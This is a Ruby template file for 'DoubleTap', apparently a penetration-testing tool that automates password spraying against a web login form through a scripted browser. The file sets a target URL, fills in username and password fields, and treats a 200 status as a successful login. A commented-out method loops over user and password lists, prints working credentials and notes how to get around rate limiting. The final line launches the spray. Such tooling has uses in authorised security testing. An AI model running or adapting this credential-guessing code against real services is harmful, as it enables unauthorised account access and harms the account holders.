require_relative '../lib/core'

class Template < DoubleTap

  # Overwrite the defaults from the DoubleTap class
  # @url is a reqired property
  def initialize
    super # Don't remove this
    # @user_agent = 'my custom agent'
    @jitter     = {min: 0, max: 1}
    # @users      = parse_file( '/tmp/vulnco.users.txt' )
    # @passwords  = parse_file( '/tmp/vulnco.pass.txt' )
    @url = 'http://172.17.0.1/'
  end

  # Define the login flow by using form-field names when instructing
  # the DoubleTap how to fill in the page.
  # The @browser variable is available and is a Capybara Session
  # object, should you need a browser action that is not yet implemented
  # in the core DoubleTap class.
  def login_flow(user:, pass:)
    visit_site
    fill_in(form_field_name: 'username', value: user)
    click_button(button_name: 'Go')
    fill_in(form_field_name: 'password', value: pass)
    click_button(button_name: 'Go')
  end

  # Tell  DoubleTap what a successful login looks like using the @browser session.
  # https://www.rubydoc.info/github/jnicklas/capybara/Capybara/Session
  def valid_login?
    # @browser.response_headers['Set-Cookie'] =~ /logged_in/
    @browser.status_code == 200
  end

  ## OPTIONAL
  ## The default is to take the first password in the list and try it with
  ## every user in the provided file.
  ## Uncomment and add code to override the core module's default behavior.
  ## You might want to override the default #spray method if your target 
  ## rate-limits login attempts
  # def spray!
  #   @users.each do |username|
  #     @passwords.each do |pass|
  #       puts "Trying #{username} with password: #{pass}" if VERBOSE
  #       begin
  #         login_flow(user: username, pass: pass)
  #       rescue => err
  #         puts "Login attempt failed:\n#{err}"
  #         redo
  #       end
  #       puts "SUCCESS: #{username}:#{pass}" if valid_login?
  #       new_session!
  #     end
  #   end
  # end

end

Template.new.spray!
